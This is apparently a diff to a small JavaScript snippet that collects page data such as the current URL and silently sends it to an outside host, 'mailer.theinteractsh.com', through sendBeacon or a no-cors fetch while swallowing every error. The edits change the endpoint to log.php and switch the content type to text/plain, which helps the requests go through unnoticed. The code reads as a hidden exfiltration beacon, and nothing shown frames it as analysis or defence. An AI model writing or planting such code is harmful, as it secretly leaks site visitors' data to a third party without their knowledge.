@@ -1,5 +1,5 @@
 (function () {
-  var ENDPOINT = 'https://mailer.theinteractsh.com/log';
+  var ENDPOINT = 'https://mailer.theinteractsh.com/log.php';
   try {
     var payload = {
       url: location.href,
@@ -12,7 +12,7 @@
     var sent = false;
     try {
       if (navigator.sendBeacon) {
-        var blob = new Blob([body], { type: 'application/json' });
+        var blob = new Blob([body], { type: 'text/plain' });
         sent = navigator.sendBeacon(ENDPOINT, blob);
       }
     } catch (_) {}
@@ -22,7 +22,7 @@
         body: body,
         keepalive: true,
         mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' }
+        headers: { 'Content-Type': 'text/plain' }
       }).catch(function () {});
     }
   } catch (_) {}
